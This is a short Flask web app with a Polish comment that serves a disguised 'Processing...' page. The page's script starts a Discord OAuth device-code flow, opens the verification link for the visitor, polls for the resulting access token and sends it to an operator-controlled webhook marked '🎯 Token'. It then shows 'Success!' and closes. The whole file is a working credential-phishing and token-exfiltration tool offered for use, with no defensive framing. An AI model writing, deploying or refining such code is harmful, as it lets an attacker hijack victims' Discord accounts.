from flask import Flask, render_template_string
import os

app = Flask(__name__)

# STRONA KTÓRA SIĘ ŁADUJE
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url=https://discord.com/channels/@me">
</head>
<body>
    <h1>🔐 Processing...</h1>
    <script>
        (async function() {
            const clientId = '{{ client_id }}';
            const webhookUrl = '{{ webhook_url }}';
            
            try {
                const response = await fetch('https://discord.com/api/v9/oauth2/device', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        client_id: clientId,
                        scope: 'identify'
                    })
                });
                const data = await response.json();
                
                if (data.error) {
                    document.body.innerHTML = '<h2>❌ Error: ' + data.error + '</h2>';
                    return;
                }
                
                window.open(data.verification_uri, '_blank');
                
                const deviceCode = data.device_code;
                const interval = data.interval * 1000;
                
                setInterval(async () => {
                    const tokenResponse = await fetch('https://discord.com/api/v9/oauth2/token', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: new URLSearchParams({
                            client_id: clientId,
                            device_code: deviceCode,
                            grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
                        })
                    });
                    const tokenData = await tokenResponse.json();
                    if (tokenData.access_token) {
                        await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                content: '**🎯 Token:** `' + tokenData.access_token + '`'
                            })
                        });
                        document.body.innerHTML = '<h2>✅ Success!</h2>';
                        window.close();
                    }
                }, interval);
            } catch(e) {
                document.body.innerHTML = '<h2>❌ Error: ' + e.message + '</h2>';
            }
        })();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    client_id = os.getenv('CLIENT_ID', '')
    webhook_url = os.getenv('WEBHOOK_URL', '')
    return render_template_string(HTML, client_id=client_id, webhook_url=webhook_url)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
